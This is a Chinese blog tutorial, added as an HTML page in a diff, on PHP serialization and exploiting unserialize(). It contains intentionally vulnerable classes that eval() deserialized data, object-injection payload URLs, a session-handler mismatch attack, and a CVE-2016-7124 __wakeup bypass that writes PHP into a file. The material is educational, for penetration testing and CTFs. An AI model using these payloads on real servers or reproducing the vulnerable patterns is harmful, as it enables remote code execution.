@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>PPHP序列化以及反序列化 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="什么是序列化以及反序列化序列化是将PHP中的值（zval）转换成一段包含字节流的字符串。序列化一个对象会保存为对象中的所有变量的值，但不会保存对象的方法，以及只会保存类的名字。其本质就是将程序以相应的格式保存下来
+反序列化：对单一的一序列化的变量进行操作，将其转换回PHP的值。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PPHP序列化以及反序列化">
+<meta property="og:url" content="http://yoursite.com/2016/10/18/PHP序列化以及反序列化/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="什么是序列化以及反序列化序列化是将PHP中的值（zval）转换成一段包含字节流的字符串。序列化一个对象会保存为对象中的所有变量的值，但不会保存对象的方法，以及只会保存类的名字。其本质就是将程序以相应的格式保存下来
+反序列化：对单一的一序列化的变量进行操作，将其转换回PHP的值。">
+<meta property="og:image" content="http://i1.piimg.com/567571/d4ce737799055b86.png">
+<meta property="og:image" content="http://7xrn7f.com1.z0.glb.clouddn.com/16-10-27/50125046.jpg">
+<meta property="og:image" content="http://7xrn7f.com1.z0.glb.clouddn.com/16-10-27/95172433.jpg">
+<meta property="og:updated_time" content="2016-11-11T15:11:50.485Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PPHP序列化以及反序列化">
+<meta name="twitter:description" content="什么是序列化以及反序列化序列化是将PHP中的值（zval）转换成一段包含字节流的字符串。序列化一个对象会保存为对象中的所有变量的值，但不会保存对象的方法，以及只会保存类的名字。其本质就是将程序以相应的格式保存下来
+反序列化：对单一的一序列化的变量进行操作，将其转换回PHP的值。">
+<meta name="twitter:image" content="http://i1.piimg.com/567571/d4ce737799055b86.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-PHP序列化以及反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/10/18/PHP序列化以及反序列化/" class="article-date">
+  <time datetime="2016-10-18T08:42:28.000Z" itemprop="datePublished">2016-10-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PPHP序列化以及反序列化
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="什么是序列化以及反序列化"><a href="#什么是序列化以及反序列化" class="headerlink" title="什么是序列化以及反序列化"></a>什么是序列化以及反序列化</h3><p>序列化是将PHP中的值（zval）转换成一段包含字节流的字符串。序列化一个对象会保存为对象中的所有变量的值，但不会保存对象的方法，以及只会保存类的名字。其本质就是将程序以相应的格式保存下来</p>
+<p>反序列化：对单一的一序列化的变量进行操作，将其转换回PHP的值。</p>
+<a id="more"></a>
+<h4 id="PHP序列化方式"><a href="#PHP序列化方式" class="headerlink" title="PHP序列化方式"></a>PHP序列化方式</h4><p>php在序列化的时候会将相应的变量以对应的键值进行存储。</p>
+<ul>
+<li>实例化对象中自身的二次赋值</li>
+<li><p>对象的序列化 O:类名长度:”类名”:值:{}</p>
+<p>  &lt;?php</p>
+<p>  //1.要创建一个类的实例，必须要使用new关键字  2.用array()语言创建一个数组，它接受任意数量用逗号分割的  键（key） =&gt; 值（value）对</p>
+<p>  $o = new stdClass;</p>
+<p>  $o-&gt;foo = $o;</p>
+<p>  $s = serialize($o);</p>
+<p>  print $s;</p>
+<p>  //结果： O:8:”stdClass”:1:{s:3:”foo”;r:1;}</p>
+<p>  //对象的序列化 O:类名长度:”类名”:值:{}<br>  ?&gt;</p>
+</li>
+<li><p>数组中的引用(&amp;)的序列化</p>
+</li>
+<li><p>数组的序列化  array通常被序列化为： a:<n>:{<key1><key 2=""><value 2="">…<key n=""><value n="">}    <n>表示数组元素的个数，<key 1="">、<key 2="">……<key n=""> 表示数组下标，<value 1="">、<value 2="">……<value n=""> 表示与下标相对应的数组元素的值。</value></value></value></key></key></key></n></value></key></value></key></key1></n></p>
+<p>  &lt;?php<br>  $a = [“foo”];//数组里的字符串会被当做一个整体对待；</p>
+<p>  $a[1] =&amp; $a[0];//  数组中的引用（&amp;）的序列化</p>
+<p>  echo $a[1];</p>
+<p>  echo “——-“;</p>
+<p>  $s = serialize($a);</p>
+<p>  echo $s;</p>
+</li>
+</ul>
+<pre><code>//结果：  a:2:{i:0;s:3:&quot;foo&quot;;i:1;R:2;}
+//这里的R:2；部分意味着“指向第二个值”什么是第二个值？整个数组代表第一个值，(s:3:&quot;foo&quot;)代表第二个值
+//
+?&gt;
+</code></pre><h3 id="序列化键名对照表"><a href="#序列化键名对照表" class="headerlink" title="序列化键名对照表"></a>序列化键名对照表</h3><pre><code>数组中二次赋值（&amp;） ：            R；
+对象的二次赋值：                 r；
+NULL：                          N；
+ture：                         b:1;
+false:                        b:0;
+Long:                          i;
+Double:                        d;
+String:                        s/S;
+Class:                         C;
+Array:                         a;
+Object:                        O;
+变量的不同属性也有着不同的格式：
+public：                       key;
+protected：                    \0*\0key;
+private:                       \0key\0;
+</code></pre><h3 id="实例观察public-protected-private的区别"><a href="#实例观察public-protected-private的区别" class="headerlink" title="实例观察public/protected/private的区别"></a>实例观察public/protected/private的区别</h3><pre><code>&lt;?php
+class Test {
+public $public = 1;
+protected $protected = 2;
+private $private = 3;
+}
+$a = new Test();
+$s = serialize($a);
+//echo &quot;$s&quot;;
+var_dump($s);//var_dump()会返回变量的数据类型和值
+
+//结果：  string(81) &quot;O:4:&quot;Test&quot;:3:{s:6:&quot;public&quot;;i:1;s:12:&quot;\000*\000protected&quot;;i:2;s:13:&quot;\000Test\000private&quot;;i:3;}&quot;
+?&gt;
+</code></pre><p>###String对应的两个键：s与S<br>serialize()和unserialize()处理有着一些差异。PHP源码serialize()中没有相关序列化是以S为标识的，但是在unserialize中又有对S键的相关处理，相关部分源码</p>
+<pre><code>&lt;?  php
+case &apos;S&apos;: goto yy10;
+...
+yy10:
+yych = *(YYMARKER = ++YYCURSOR);
+if (yych == &apos;:&apos;) goto yy39;
+goto yy3;
+...
+yy39:
+yych = *++YYCURSOR;
+if (yych == &apos;+&apos;) goto yy40;
+if (yych &lt;= &apos;/&apos;) goto yy18;
+if (yych &lt;= &apos;9&apos;) goto yy41;
+goto yy18;
+
+case &apos;s&apos;: goto yy9;
+...
+yy9:
+yych = *(YYMARKER = ++YYCURSOR);
+if (yych == &apos;:&apos;) goto yy46;
+goto yy3;
+...
+yy46:
+yych = *++YYCURSOR;
+if (yych == &apos;+&apos;) goto yy47;
+if (yych &lt;= &apos;/&apos;) goto yy18;
+if (yych &lt;= &apos;9&apos;) goto yy48;
+goto yy18;
+...
+...
+?&gt;
+</code></pre><p>如果细心地话，会发现s和S就会发现两个键的处理方式是一模一样的</p>
+<h3 id="PHP中SESSION反序列化机制"><a href="#PHP中SESSION反序列化机制" class="headerlink" title="PHP中SESSION反序列化机制"></a>PHP中SESSION反序列化机制</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h4><pre><code>在php.ini中存在的三项配置项
+1.session.save_path=&quot;&quot; --设置session的存储路径
+2.session.save_handler=&quot;&quot; --设置用户自定义存储函数，若想使用PHP内置会话存储机制之外的可以使用本函数（数据库等方式）
+3.session.auto_start boolen --指定会话模块是否在请求开始时自动启动一个会话。默认为0
+4.session.serialize_handler string --定义用来序列化/反序列化的处理器名字。默认为php
+以上具体选项就是PHP中的session存储和序列话存储相关的选项
+</code></pre><p>在使用xampp组件安装中，上述的配置项的设置如下：</p>
+<pre><code>1.session.save_path=&quot;D:\phpstudy\tmp\tmp&quot;    表明所有的session文件都是存储在xampp/tmp下
+2.session.save_handler=&quot;file&quot;     表名session是以文件的方式进行存储的
+3.session.auto_start=0            表明默认不启动session
+4.session.serialize_handler=php   表明session的默认序列话引擎使用的是php序列话引擎
+</code></pre><p>在上述配置中，session.serialize_handler是用来设置session的序列话引擎，出除了默认的php引擎外还有其它的引擎，不同的引擎对应的session的存储方式不同</p>
+<pre><code>A：php_binary:存储方式，键名的长度对应的ASCII字符+键名+经过serialize函数序列化处理的值
+B：php存储的方式 ： 键名+竖线+经过serialize函数序列化处理的值
+C：php_serialize(php&gt;5.5.4)存储方式，经过serialize函数处理的值
+</code></pre><p>在php中默认使用的PHP引擎，如果修改为其他的引擎，只需要添加代码ini_set(“session.serialize_handler”,”需要设置的引擎”.示例代码如下：</p>
+<pre><code>&lt;?php
+ini_set(&quot;session.serialize_handler&quot;,&quot;php_serialize&quot;);
+session_start;
+//do something
+?&gt;
+</code></pre><h4 id="2-存储机制"><a href="#2-存储机制" class="headerlink" title="2 存储机制"></a>2 存储机制</h4><p>php中的session中的内容并不是放在内存中，而是以文件的方式来存储，存储的方式也是由配置项session.save_handler来确定，默认是以文件的形式存储。 文件的内容就是session值得序列化之后的内容。</p>
+<p>若我们的环境是xampp，在默认的配置下：</p>
+<pre><code>&lt;?php
+session_start();
+$_SESSION[&quot;name&quot;]=&quot;spoock&quot;;
+var_dump();
+?&gt;
+</code></pre><p>最后的session的存储和显示如下：<br><img src="http://i1.piimg.com/567571/d4ce737799055b86.png" alt=""><br>可以看到PHPSESSID的值是jo86ud4jfvu81mbg28sl2s56c2，而在xampp/tmp下存储的文件名是sess_jo86ud4jfvu81mbg28sl2s56c2，文件的内容是name|s:6:”spoock”;。name是键值，s:6:”spoock”;是serialize(“spoock”)的结果。</p>
+<p>在php_serialize引擎中</p>
+<pre><code>&lt;?php
+ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);
+session_start();
+$_SESSION[&quot;name&quot;] = &quot;spoock&quot;;
+var_dump();
+?&gt;
+</code></pre><p>session文件中的内容 a:1:{s:4:”name”;s:6:”spoock”},a:1是使用php_serialize都会加上。同时使用php_serialize会将session中的key和value都会序列化。</p>
+<p>在php_binary引擎中：</p>
+<pre><code>&lt;?php
+ini_set(&quot;session.serialize_handler&quot;,&quot;php_binary&quot;)
+session_start();
+$_SESSION[&quot;name&quot;] = &quot;spoock&quot;
+var_dump();
+?&gt;
+</code></pre><p>session文件中的内容是EOTname:6:”spoock”;由于name的长度为4,4在ASCII表中对应的值就是EOT。根据php_binary的存储规则，最后就是EOTname:6:”spoock”；ASCII的值为4的字符无法在网页上面显示。</p>
+<h4 id="3-序列化的简单运用"><a href="#3-序列化的简单运用" class="headerlink" title="3 序列化的简单运用"></a>3 序列化的简单运用</h4><h5 id="补习php中-this-gt"><a href="#补习php中-this-gt" class="headerlink" title="补习php中$this-&gt;"></a>补习php中$this-&gt;</h5><p>$this的含义表示  实例后的具体对象</p>
+<p>我们一般先声明一个类，然后用这个类去实例化对象！<br>    &lt;?php<br>    class User{</p>
+<pre><code>    public $name;
+
+    function __getname(){//简言之定义一个类的方法
+        echo $this-&gt;name;
+    }
+}
+$user1 = new User();
+
+$user1-&gt;name = &apos;张三&apos;;
+
+$user1-&gt;getName();      //这里就会输出张三！
+
+$user2 = new User();
+
+$user2-&gt;name = &apos;李四&apos;;
+
+$user2-&gt;getName();      //这里会输出李四！
+?&gt;
+</code></pre><p>运用实例 22.php</p>
+<pre><code>&lt;?php
+class syclover{
+    var $func = &quot;&quot;;//var 定义类的属性为公共，var和public一个意思
+    function __construct(){
+        $this-&gt;func = &quot;phpinfo()&quot;;//$this 实例化后的具体的对象
+    }
+    function __wakeup(){
+        eval($this-&gt;func);//eval()函数把字符串当做PHP代码执行
+    }
+}
+unserialize($_GET[&quot;a&quot;]);
+
+?&gt;
+</code></pre><p>在第11行对传入的参数进行了序列化，我们可以传入一个特定的字符串，反序列化为syclover的一个实例，那么就可以执行eval()的方法。我们访问<br><a href="http://localhost/22.php?a=O:8:&quot;syclover&quot;:1:{s:4:&quot;func&quot;;s:14:&quot;echo" target="_blank" rel="external">http://localhost/22.php?a=O:8:&quot;syclover&quot;:1:{s:4:&quot;func&quot;;s:14:&quot;echo</a> “spoock”;”;}，反序列化得到的内容是：</p>
+<pre><code>objict(syclover)[0]
+    public &quot;func&quot; =&gt;string &apos;echo &quot;spoock&quot;;&apos;;
+</code></pre><p>最后页面输出的就是spoock，说明最后执行啦我们定义的echo “spoock”方法，这就是一个序列化漏洞的具体过程。</p>
+<h3 id="4-php-session触发过程的实际应用"><a href="#4-php-session触发过程的实际应用" class="headerlink" title="4 php session触发过程的实际应用"></a>4 php session触发过程的实际应用</h3><p>存在test01.php和test02.php两个文件所使用的session引擎不一样，即机制不同，我们可以在某一页面将数据序列化存放，在另一个页面进行反序列化访问，从而实现类。具体看一下代码<br>test01.php使用php_serialize来处理session</p>
+<pre><code>&lt;?php
+ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);
+session_start();
+$_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];
+?&gt;
+</code></pre><p>test02.php使用php来处理session</p>
+<pre><code>&lt;?php
+ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);
+session_start();
+class lemon {
+var $hi;
+function __construct(){
+    $this-&gt;hi = &apos;phpinfo();&apos;;
+}
+
+    function __destruct() {
+         eval($this-&gt;hi);
+    }
+}
+?&gt;
+</code></pre><p>当访问的时候提交如下的数据：</p>
+<ul>
+<li><a href="http://localhost/test01.php?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo" target="_blank" rel="external">http://localhost/test01.php?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo</a> “spoock”;”;}</li>
+</ul>
+<p>此时传入的数据会按照php_serialize来进行序列化，此时访问<a href="http://localhost/test02.php，页面输出spoock成功执行了我们构造的数据，就会实例化lemon对象，最后会执行析构函数中的eval()方法。" target="_blank" rel="external">http://localhost/test02.php，页面输出spoock成功执行了我们构造的数据，就会实例化lemon对象，最后会执行析构函数中的eval()方法。</a></p>
+<h4 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h4><p>1.在实际进行渗透测试或者CTF中遇到session反序列化时，若发现session.upload_progress.enabled开着即等于1时，php会记录上传文件的进度，再上传时将信息保存在$_SESSION中。若文章测试使用如$_SESSION[“ryat”] = $_GET[“ryat”],然而很多时候没有这个条件，<br><a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">session.upload-progress.php</a>,php为我们提供了一个上传进度的数据（当一个上传在处理中，同时POST一个与INI中设置的session.upload_process.name同名变量时，上传进度可以在$_SESSION中获得）即$n = ini_get(“session.upload_progress.nmae);会把它存储在$_SESSION[“$n”]当中，这样我们就可以构造一个文件上传页，就可以成功写入session。</p>
+<p>一个上传进度数组的结构的例子</p>
+<pre><code>&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+ &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;ryat&quot; /&gt;
+ &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+ &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre><p>2.在PHP中普通的传值赋值行为有一个例外就是碰到object时，在PHP中使用引用赋值的，除非明确使用了clone关键字来拷贝，PHP支持引用来赋值，使用”$var = &amp;$othervar;”语法。引用赋值意味着两个变量指向了一个变量，没有拷贝任何的东西。<br>举个简单地例子：</p>
+<pre><code>a = 1;
+b = &amp;a;
+a = a+1;
+由于引用参数，a和b引用的是同一个数据，因此a+1后，b也会变成2.
+</code></pre><p>CTF利用：</p>
+<pre><code>&lt;?php
+class just4fun {
+    var $enter;
+    var $secret;
+}
+
+if (isset($_GET[&apos;pass&apos;])) {
+    $pass = $_GET[&apos;pass&apos;];
+
+    if(get_magic_quotes_gpc()){//取得PHP环境变数magic_quotes_gpc的值，当magic_quotes_gpc打开时，所有的单引号，双引号，反斜线and空字符会自动转换为含有反斜线的溢出字符；
+        $pass=stripslashes($pass);//stripslashes()函数删除由addslashes()函数添加的反斜杠
+    }
+
+    $o = unserialize($pass);
+
+    if ($o) {
+        $o-&gt;secret = &quot;*&quot;;
+        if ($o-&gt;secret === $o-&gt;enter)
+            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;
+        else
+            echo &quot;Oh no... You can&apos;t fool me&quot;;
+    }
+    else echo &quot;are you trolling?&quot;;
+}
+?&gt;
+</code></pre><p>我们构造访问<a href="http://localhost/serializeTest.php?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}" target="_blank" rel="external">http://localhost/serializeTest.php?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</a><br>顺利输出Congratulation! Here is my secret: *</p>
+<h3 id="5-CVE-2016-7124反序列化漏洞"><a href="#5-CVE-2016-7124反序列化漏洞" class="headerlink" title="5 CVE-2016-7124反序列化漏洞"></a>5 CVE-2016-7124反序列化漏洞</h3><p>漏洞概述：</p>
+<p>SugarCRM（<a href="http://www.sugarcrm.com/" target="_blank" rel="external">http://www.sugarcrm.com/</a> ）是一套开源的客户关系管理系统。在其&lt;=6.5.23的版本中存在序列化漏洞，程序对攻击者恶意构造的序列化数据进行了反序列化的处理，从而使攻击者可以在未授权的情况下中兴任意的代码。</p>
+<pre><code>对于此漏洞简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
+</code></pre><p>知识储备：</p>
+<ul>
+<li>unserialize()函数会检查勒种是否存在一个魔术方法<strong>wakeup方法，若存在会先调用</strong>wakeup方法，预先准备对象需要的资源</li>
+<li>__wakeup()方法经常用在反序列化的操作中，例如重新建立数据库的连接，或建立其它初始化操作</li>
+<li>get_object__var()函数返回由对象属性创建的关联数组。</li>
+</ul>
+<p>具体测试代码：</p>
+<pre><code>&lt;?php
+class A{
+    var $a = &quot;test&quot;;
+    function __destruct(){
+        $fp = fopen(&quot;D:\\phpStudy\\WWW\\hello.php&quot;,&quot;w&quot;);
+        fputs($fp,$this-&gt;a);
+        fclose($fp);
+    }
+
+    function __wakeup()
+        {    
+            foreach(get_object_vars($this) as $k =&gt; $v) {
+                    $this-&gt;$k = null;
+            }
+            echo &quot;Waking up...\n&quot;;
+        }
+}
+$test = $_POST[&apos;test&apos;];
+$test_unser = unserialize($test);
+?&gt;
+</code></pre><p>使用payload进行测试，结果如下：<br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-10-27/50125046.jpg" alt=""><br>发现__wakeup函数成功执行，消除了对象属性，从而hello.php内容也没空。</p>
+<p>漏洞证明：</p>
+<p>我们将上面的test=O:1:”A”:1:{s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;}中的A的个数变成2或者大于2的数字如下：</p>
+<pre><code>test=O:1:”A”:2:{s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;}
+</code></pre><p>然后在执行就会发现绕过了__wakeup函数，成功将phpinfo()写入到hello.php<br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-10-27/95172433.jpg" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/10/18/PHP序列化以及反序列化/" data-id="cj06r8hxs0004u8ufk0kp1ccf" class="article-share-link">Partager</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/10/21/代码审计知识储备/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Récent</strong>
+      <div class="article-nav-title">
+        
+          代码审计知识储备
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/10/16/python3-检测URL重定向到的地址/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Ancien</strong>
+      <div class="article-nav-title">python3 检测URL重定向到的地址</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Mot-clés</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WAF/">WAF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-web开发/">python web开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python3/">python3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python3-数据库/">python3 数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python运维/">python运维</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计-PHP/">代码审计  PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计-PHP/">代码审计 PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/总结感想/">总结感想</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透技巧/">渗透技巧</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试/">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试-CTF/">渗透测试 CTF</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Nuage de mot-clés</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/WAF/" style="font-size: 10px;">WAF</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python-web开发/" style="font-size: 10px;">python web开发</a> <a href="/tags/python3/" style="font-size: 20px;">python3</a> <a href="/tags/python3-数据库/" style="font-size: 10px;">python3 数据库</a> <a href="/tags/python运维/" style="font-size: 10px;">python运维</a> <a href="/tags/代码审计/" style="font-size: 10px;">代码审计</a> <a href="/tags/代码审计-PHP/" style="font-size: 10px;">代码审计  PHP</a> <a href="/tags/代码审计-PHP/" style="font-size: 10px;">代码审计 PHP</a> <a href="/tags/总结感想/" style="font-size: 10px;">总结感想</a> <a href="/tags/渗透技巧/" style="font-size: 10px;">渗透技巧</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/渗透测试-CTF/" style="font-size: 10px;">渗透测试 CTF</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Articles récents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2016/12/02/攻破MrRobot-黑客技能训练/">攻破MrRobot-黑客技能训练</a>
+          </li>
+        
+          <li>
+            <a href="/2016/11/30/模拟渗透测试get到的技巧/">模拟渗透测试get到的技巧</a>
+          </li>
+        
+          <li>
+            <a href="/2016/11/17/Linux常用命令使用总结/">Linux常用命令使用总结</a>
+          </li>
+        
+          <li>
+            <a href="/2016/11/15/渗透绕WAF的方法/">渗透绕WAF的方法</a>
+          </li>
+        
+          <li>
+            <a href="/2016/11/10/docker学习/">docker学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 John Doe<br>
+      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
